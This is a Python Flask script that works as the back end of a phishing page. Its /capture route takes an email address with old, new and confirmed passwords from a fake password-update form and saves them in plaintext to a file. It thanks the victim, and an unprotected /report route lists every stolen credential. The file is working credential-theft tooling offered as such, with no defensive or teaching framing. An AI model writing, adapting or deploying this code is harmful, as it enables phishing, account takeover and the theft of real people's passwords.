from flask import Flask, request

app = Flask(__name__)

# Path to the text file where captured data will be saved
capture_file = 'captured_data.txt'

@app.route('/capture', methods=['POST'])
def capture():
    email = request.form.get('email')
    old_password = request.form.get('old_password')
    new_password = request.form.get('new_password')
    confirm_password = request.form.get('confirm_password')

    # Log the captured data to the text file
    if email and old_password and new_password and confirm_password:
        with open(capture_file, 'a') as file:
            file.write(f"Email: {email}\n")
            file.write(f"Old Password: {old_password}\n")
            file.write(f"New Password: {new_password}\n")
            file.write(f"Confirm Password: {confirm_password}\n")
            file.write("-" * 40 + "\n")
        print(f"Captured data: {email}")

    # Redirect to a page or simply thank the user
    return "<h1>Thank you for updating your password!</h1>", 200

@app.route('/report')
def report():
    # Display the captured data in the text file
    with open(capture_file, 'r') as file:
        content = file.read()
    return f"<pre>{content}</pre>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
